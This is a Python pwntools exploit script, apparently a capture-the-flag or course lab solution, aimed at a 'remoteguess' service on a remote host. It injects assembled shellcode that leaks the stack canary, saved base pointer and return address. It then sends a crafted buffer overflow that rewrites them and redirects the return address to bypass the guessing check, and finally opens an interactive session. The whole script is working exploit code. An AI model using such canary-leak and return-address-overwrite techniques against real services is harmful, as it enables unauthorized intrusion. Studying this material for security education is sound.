#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()

payload = asm('''
enter  0x30,0
mov    r8,rdi
mov    rax,QWORD PTR fs:0x28
mov    QWORD PTR [rbp-0x8],rax
xor    eax,eax
mov    QWORD PTR [rbp-0x20],rax
mov    QWORD PTR [rbp-0x18],rdx
lea    rax,[rbp+0x08]
mov    rcx,QWORD PTR [rax]
mov    rdx,QWORD PTR [rax-0x8]
mov    rax,QWORD PTR [rax-0x10]
mov    rsi,rax
lea    rax,[rip+str1]
mov    rdi,rax
mov    eax,0x0
call   r8
leave  
ret   
str1: .String "%lu\\n%lu\\n%lu\\n"
''')


#r = process("./remoteguess", shell=True)
#r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)


print("** {} bytes to submit".format(len(payload)))
r.sendlineafter(b'send to me? ', str(len(payload)).encode())
r.sendlineafter(b'to call? ', str(0).encode())
r.sendafter(b'bytes): ', payload)

r.recv()
text = r.recv().decode().split("\n")
canary = int(text[0])
rbp = int(text[1])
return_addr = int(text[2])
print(text)

myguess = 1234

r.sendline(str(myguess).encode('ascii').ljust(0x18, b'\0') + p64(canary) + p64(rbp) + p64(return_addr+0xab).ljust(0x14, b'\0') + p32(myguess))

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :